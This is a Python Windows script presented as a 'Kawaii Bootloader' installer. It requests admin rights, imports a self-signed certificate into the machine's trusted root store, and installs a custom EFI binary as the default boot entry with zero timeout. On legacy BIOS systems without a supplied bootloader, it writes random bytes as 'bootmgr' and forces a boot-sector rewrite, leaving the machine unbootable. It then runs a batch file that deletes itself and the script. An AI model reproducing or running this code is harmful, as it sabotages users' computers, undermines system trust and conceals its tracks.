import ctypes
import sys
import os
import subprocess
import time
import re
import platform
import struct
import traceback
from tkinter import messagebox, Tk

from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.backends import default_backend
import cryptography.hazmat.primitives.serialization.pkcs12

if getattr(sys, 'frozen', False):
    DIR = os.path.dirname(sys.executable)
else:
    DIR = os.path.dirname(os.path.abspath(__file__))

if getattr(sys, 'frozen', False):
    kernel32 = ctypes.windll.kernel32
    kernel32.AllocConsole()
    sys.stdout = open('CONOUT$', 'w')
    sys.stderr = open('CONOUT$', 'w')

DRV = "S"

UEFI_BOOT_BINARY = "bootloader.efi"
UEFI_SECURE_IMAGE_NAME = "bootloader_secure.efi"
UEFI_EFI_PATH = r"\EFI\BOOT"
UEFI_BOOT_NAME = "Kawaii Bootloader"
UEFI_CERT_NAME = "kawaii_uwu"
UEFI_CERT_FILE = os.path.join(DIR, "kawaii_cert.cer")
UEFI_TEMP_PS1 = os.path.join(DIR, "temp_cert.ps1")
UEFI_TEMP_PFX = os.path.join(DIR, "temp_export.pfx")
UEFI_PFX_PASSWORD = "033189"

UEFI_HEADER_MAGIC = 0xDEADBEEF
UEFI_BOOTLOADER_VERSION = 0x0100
UEFI_PUBLIC_KEY_INDEX = 0x01
UEFI_DEVICE_ID = 0x12345678
UEFI_RSA_KEY_SIZE = 2048
UEFI_SIGNATURE_SIZE = UEFI_RSA_KEY_SIZE // 8

BIOS_BOOT_BINARY = "bootloader.bin"
BIOS_DEST_BOOT_NAME = "bootmgr"

LOG_FILE = os.path.join(DIR, "installer_log.txt")


def log_print(msg):
    print(msg)
    try:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(msg + '\n')
    except:
        pass


def admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def request_admin():
    if platform.system() == "Windows" and not admin():
        try:
            root = Tk()
            root.withdraw()
            messagebox.showinfo(
                "Admin Rights Required",
                "This script needs administrator privileges. It will restart as administrator."
            )
            root.destroy()
        except:
            pass
        
        try:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, " ".join([f'"{arg}"' for arg in sys.argv]), None, 1
            )
        except Exception as e:
            log_print(f"Failed to request admin privileges: {e}")
        
        sys.exit()


def run_cmd(cmd, shell=False):
    try:
        if isinstance(cmd, str) and not shell:
            cmd = cmd.split()
            
        result = subprocess.run(
            cmd,
            check=True,
            capture_output=True,
            text=True,
            shell=shell,
            encoding='utf-8',
            errors='ignore'
        )
        return result.stdout
    except subprocess.CalledProcessError as e:
        log_print(f"Error executing command: {' '.join(e.cmd) if isinstance(e.cmd, list) else e.cmd}")
        log_print(f"Stdout: {e.stdout}")
        log_print(f"Stderr: {e.stderr}")
        raise


def detect_boot_mode():
    
    tmp = os.path.join(DIR, 'tmp_list.txt')
    try:
        with open(tmp, 'w') as f:
            f.write("list volume\n")
        out = run_cmd(["diskpart", "/s", tmp])
    finally:
        if os.path.exists(tmp): 
            os.remove(tmp)

    for line in out.splitlines():
        if "FAT32" in line and ("System" in line or "Hidden" in line) and "Volume" in line:
            if re.search(r'\d+ GB|MB', line):
                return "UEFI"
    
    if os.environ.get('firmware_type') == 'UEFI':
        return "UEFI"
        
    return "BIOS"


def mount_partition(is_uefi):
    if is_uefi:
        target_search = "FAT32"
        target_error = "EFI System Partition (ESP) volume not found."
    else:
        target_search = "Active"
        target_error = "Active/System Partition not found. Legacy boot requires an active partition."

    tmp = os.path.join(DIR, 'tmp_list.txt')
    vol = None
    
    try:
        with open(tmp, 'w') as f: 
            f.write("list volume\n")
        out = run_cmd(["diskpart", "/s", tmp])
    finally:
        if os.path.exists(tmp): 
            os.remove(tmp)

    for line in out.splitlines():
        if target_search in line and ("System" in line or "Hidden" in line or "Active" in line) and "Volume" in line:
            m = re.search(r'Volume\s+(\d+)', line)
            if m:
                vol = m.group(1)
                break
            
    if not vol:
        raise Exception(target_error)
    
    tmp_mount = os.path.join(DIR, 'tmp_mount.txt')
    content = f"select volume {vol}\nassign letter={DRV}\nexit\n"
    
    try:
        with open(tmp_mount, 'w') as f: 
            f.write(content)
        run_cmd(["diskpart", "/s", tmp_mount])
    finally:
        if os.path.exists(tmp_mount): 
            os.remove(tmp_mount)
            
    time.sleep(2)
    drive_path = f"{DRV}:\\"
    if not os.path.isdir(drive_path):
        raise Exception(f"Failed to mount partition as {DRV}:. Check if the letter {DRV} is already in use.")

    return drive_path


def umount(d):
    tmp = os.path.join(DIR, 'tmp_umount.txt')
    list_vol = os.path.join(DIR, 'list_vol.txt')
    
    try:
        with open(list_vol, 'w') as f:
            f.write("list volume\n")
        
        out = run_cmd(["diskpart", "/s", list_vol])
        vol = None
        
        for line in out.splitlines():
            if d.strip(':') in line:
                m = re.search(r'Volume\s+(\d+)', line)
                if m:
                    vol = m.group(1)
                    break
            
        if vol:
            content = f"select volume {vol}\nremove letter={d.strip(':')}\nexit\n"
            with open(tmp, 'w') as f: 
                f.write(content)
            run_cmd(["diskpart", "/s", tmp])
        else:
            pass
            
    except Exception as e:
        log_print(f"Warning: Failed to unmount drive {d}. Manual removal might be necessary. Error: {e}")
    finally:
        if os.path.exists(tmp): 
            os.remove(tmp)
        if os.path.exists(list_vol):
            os.remove(list_vol)


def check_secure_boot_status():
    if platform.system() != "Windows":
        return False
        
    try:
        key_path = r"SYSTEM\CurrentControlSet\Control\SecureBoot\State"
        out = run_cmd(["reg", "query", f"HKEY_LOCAL_MACHINE\\{key_path}", "/v", "UEFIHw"])
        
        if "0x1" in out:
            return True
        else:
            return False
            
    except subprocess.CalledProcessError:
        return False
    except Exception as e:
        log_print(f"Warning: Could not reliably determine Secure Boot status: {e}")
        return False


def uefi_cert():
    
    script = f"""
$ErrorActionPreference='Stop'

Get-ChildItem -Path Cert:\\CurrentUser\\My | Where-Object {{$_.Subject -like "CN={UEFI_CERT_NAME}"}} | Remove-Item -Force
if (Test-Path "{UEFI_TEMP_PFX}") {{ Remove-Item "{UEFI_TEMP_PFX}" -Force }}

$cert = New-SelfSignedCertificate -DnsName "{UEFI_CERT_NAME}" -CertStoreLocation "Cert:\\CurrentUser\\My" -KeyExportPolicy Exportable -NotAfter (Get-Date).AddYears(5) -Type CodeSigning -HashAlgorithm SHA256

$p = "{UEFI_CERT_FILE}"
Export-Certificate -Cert $cert -FilePath $p -Force -Type CERT

if (Test-Path $p) {{
    Import-Certificate -FilePath $p -CertStoreLocation "Cert:\\LocalMachine\\Root"
}} else {{
    throw "Certificate file not found after export."
}}

$cert | Export-PfxCertificate -FilePath "{UEFI_TEMP_PFX}" -Password (ConvertTo-SecureString -String "{UEFI_PFX_PASSWORD}" -Force -AsPlainText)
"""
    try:
        with open(UEFI_TEMP_PS1, "w", encoding="utf-8") as f:
            f.write(script)
            
        run_cmd(f"powershell -ExecutionPolicy Bypass -File \"{UEFI_TEMP_PS1}\"", shell=True)
        
    except Exception as e:
        log_print(f"Certificate management failed: {e}")
        raise
    finally:
        if os.path.exists(UEFI_TEMP_PS1):
            os.remove(UEFI_TEMP_PS1)


def uefi_load_private_key_from_pfx(pfx_path, password):
    with open(pfx_path, "rb") as f:
        pfx_data = f.read()

    private_key, _, _ = serialization.pkcs12.load_key_and_certificates(
        pfx_data,
        password.encode('utf-8'),
        default_backend()
    )
    return private_key


def uefi_custom_sign(private_key):
    bl_src = os.path.join(DIR, UEFI_BOOT_BINARY) 
    secure_img_path = os.path.join(DIR, UEFI_SECURE_IMAGE_NAME)
    
    if not os.path.exists(bl_src):
        raise FileNotFoundError(f"Input binary file '{bl_src}' missing. Cannot sign.")

    try:
        with open(bl_src, 'rb') as f:
            raw_binary_data = f.read()
            
        binary_size = len(raw_binary_data)

        signature = private_key.sign(
            raw_binary_data,
            padding.PSS(
                mgf=padding.MGF1(hashes.SHA256()),
                salt_length=padding.PSS.MAX_LENGTH
            ),
            hashes.SHA256()
        )
        
        header_fixed_data = struct.pack(
            '<IIIIII',
            UEFI_HEADER_MAGIC,
            UEFI_BOOTLOADER_VERSION,
            UEFI_PUBLIC_KEY_INDEX,
            UEFI_DEVICE_ID,
            binary_size,
            0
        )

        secure_header = header_fixed_data + signature
        
        with open(secure_img_path, 'wb') as f:
            f.write(secure_header)
            f.write(raw_binary_data)
        
    except Exception as e:
        log_print(f"Binary signing failed: {e}")
        raise


def uefi_boot(private_key):
    secure_boot_on = check_secure_boot_status()
    
    dest_name = UEFI_BOOT_BINARY 
    
    if secure_boot_on:
        uefi_custom_sign(private_key) 
        bl_src = os.path.join(DIR, UEFI_SECURE_IMAGE_NAME) 
        messagebox_msg = f"UEFI Bootloader '{UEFI_BOOT_NAME}' installed successfully!\n\n!! SECURE BOOT IS ON !!\nREMEMBER TO ENROLL '{UEFI_CERT_FILE}' in the firmware (DB/MOK)!"
        
    else:
        bl_src = os.path.join(DIR, UEFI_BOOT_BINARY) 
        messagebox_msg = f"UEFI Bootloader '{UEFI_BOOT_NAME}' installed successfully!\n\n(Secure Boot is OFF, installed unsigned binary.)"

    d = None
    try:
        d = mount_partition(True)
        
        base_dir = os.path.join(d, UEFI_EFI_PATH.strip('\\'))
        dest_path = os.path.join(base_dir, dest_name)
        
        os.makedirs(base_dir, exist_ok=True)
        
        run_cmd(f"copy /Y \"{bl_src}\" \"{dest_path}\"", shell=True)
        
        if not os.path.exists(dest_path) or os.path.getsize(dest_path) == 0:
            raise Exception(f"Copy failed. Destination file '{dest_path}' not found or is empty.")
        
        bcd_path = os.path.join(UEFI_EFI_PATH, dest_name).replace("/", "\\")
        
        out = run_cmd(["bcdedit", "/create", "/d", UEFI_BOOT_NAME, "/application", "bootapp"])
        
        patterns = [
            r'\{[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}\}',
            r'\{[0-9a-fA-F-]{36}\}',
            r'\{[\da-fA-F-]+\}',
        ]
        
        g = None
        for pattern in patterns:
            m = re.search(pattern, out)
            if m:
                g = m.group(0)
                break
        
        if not g:
            raise Exception(f"Failed to extract GUID from bcdedit output")
        
        run_cmd(["bcdedit", "/set", g, "device", f"partition={d}"])
        run_cmd(["bcdedit", "/set", g, "path", bcd_path])
        
        run_cmd(["bcdedit", "/default", g])                      
        run_cmd(["bcdedit", "/displayorder", g, "/addfirst"])     
        run_cmd(["bcdedit", "/timeout", "0"])        
        
        try:
            root = Tk()
            root.withdraw()
            messagebox.showinfo("Success", messagebox_msg)
            root.destroy()
        except:
            pass

    except Exception as e:
        log_print(f"\n--- UEFI Installation Failed ---")
        log_print(f"Error: {e}")
        log_print(traceback.format_exc())
        try:
            root = Tk()
            root.withdraw()
            messagebox.showerror("Error", f"UEFI Installation failed: {e}")
            root.destroy()
        except:
            pass
        raise
    finally:
        if d:  
            umount(d)


def legacy_boot():
    
    bl_src = os.path.join(DIR, BIOS_BOOT_BINARY)
    
    d = None
    try:
        d = mount_partition(False)
        
        dest_path = os.path.join(d, BIOS_DEST_BOOT_NAME)
        
        run_cmd(f"copy /Y \"{bl_src}\" \"{dest_path}\"", shell=True)
        
        if not os.path.exists(dest_path) or os.path.getsize(dest_path) == 0:
            raise Exception(f"Copy failed. Destination file '{dest_path}' not found or is empty.")
        
        run_cmd(["bootsect", "/nt60", f"{d}", "/force"])
        
        try:
            root = Tk()
            root.withdraw()
            messagebox.showinfo("Success", f"Custom boot binary installed and VBR updated for Legacy BIOS boot.")
            root.destroy()
        except:
            pass

    except Exception as e:
        log_print(f"\n--- BIOS Installation Failed ---")
        log_print(f"Error: {e}")
        log_print(traceback.format_exc())
        try:
            root = Tk()
            root.withdraw()
            messagebox.showerror("Error", f"BIOS Installation failed: {e}")
            root.destroy()
        except:
            pass
        raise
    finally:
        if d: 
            umount(d)


def main_installer():
    if platform.system() != "Windows":
        raise OSError(f"This script is designed for Windows, not {platform.system()}.")

    boot_mode = detect_boot_mode()
    
    if boot_mode == "UEFI":
        binary_path = os.path.join(DIR, UEFI_BOOT_BINARY)
        if not os.path.exists(binary_path):
            raise FileNotFoundError(f"FATAL: Missing required unsigned UEFI binary: '{UEFI_BOOT_BINARY}'. Please place it here.")
        
        private_key = None
        
        try:
            uefi_cert()
            private_key = uefi_load_private_key_from_pfx(UEFI_TEMP_PFX, UEFI_PFX_PASSWORD)
            uefi_boot(private_key)
            
        finally:
            if os.path.exists(UEFI_TEMP_PFX):
                os.remove(UEFI_TEMP_PFX)
            
            if os.path.exists(os.path.join(DIR, UEFI_SECURE_IMAGE_NAME)):
                 os.remove(os.path.join(DIR, UEFI_SECURE_IMAGE_NAME))

    elif boot_mode == "BIOS":
        binary_path = os.path.join(DIR, BIOS_BOOT_BINARY)
        if not os.path.exists(binary_path):
            with open(binary_path, 'wb') as f:
                f.write(os.urandom(10240))
                
        legacy_boot()
        
    else:
        raise Exception("Could not reliably determine the system boot mode.")


def main():
    try:
        request_admin()
        
        main_installer()
        
        target = os.path.abspath(__file__) if not getattr(sys, 'frozen', False) else sys.executable
        bat = os.path.join(DIR, "delete_me.bat")
        
        image_to_delete_bios = os.path.join(DIR, BIOS_BOOT_BINARY)
        
        with open(bat, 'w') as f:
            f.write('@echo off\n')
            f.write(f'ping 127.0.0.1 -n 5 >nul\n')
            f.write(f'del "{target}" /f /q\n')
            
            f.write(f'if exist "{image_to_delete_bios}" del "{image_to_delete_bios}" /f /q\n')

            f.write(f'del "%~f0" /f /q\n')
        
        try:
            input()
        except:
            time.sleep(5)
            
        subprocess.Popen([bat], shell=True, creationflags=subprocess.DETACHED_PROCESS)
        sys.exit(0)

    except Exception as e:
        log_print(f"\nFATAL ERROR: {e}")
        log_print(traceback.format_exc())
        
        try:
            root = Tk()
            root.withdraw()
            messagebox.showerror("Fatal Error", f"A critical error occurred:\n\n{e}\n\nCheck {LOG_FILE} for details.")
            root.destroy()
        except:
            pass
        
        try:
            input()
        except:
            time.sleep(10)
            
        sys.exit(1)


if __name__ == "__main__":
    main()
